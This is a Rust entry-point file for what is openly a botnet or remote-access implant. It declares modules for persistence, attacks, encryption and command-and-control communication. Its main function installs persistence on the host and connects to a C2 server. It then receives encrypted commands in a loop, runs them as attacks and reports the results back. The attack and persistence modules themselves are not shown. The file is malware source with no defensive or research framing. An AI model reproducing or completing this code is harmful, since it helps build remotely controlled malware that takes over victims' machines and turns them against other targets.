mod config;
mod communication;
mod commands;
mod error;
mod persistence;
mod attacks;
mod encryption;
mod utils;

use config::Config;
use communication::connect_to_c2;
use persistence::add_persistence;
use attacks::execute_attack;
use commands::CommandResult;
use error::handle_error;
use tokio::runtime::Runtime;

fn main() {
    let config = Config::load();
    add_persistence();

    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        match connect_to_c2(&config).await {
            Ok(mut socket) => {
                let key = config.encryption_key.as_bytes();
                loop {
                    let command = match communication::receive_command(&mut socket, key).await {
                        Ok(cmd) => cmd,
                        Err(e) => {
                            handle_error(e);
                            break;
                        }
                    };

                    let result_str = match execute_attack(&command).await {
                        Ok(()) => "OK".to_string(),
                        Err(e) => format!("Error: {}", e),
                    };

                    let result = CommandResult {
                        id: command.id,
                        result: result_str,
                    };

                    if let Err(e) = communication::send_result(&mut socket, &result, key).await {
                        handle_error(e);
                        break;
                    }
                }
            }
            Err(e) => handle_error(e),
        }
    });
}
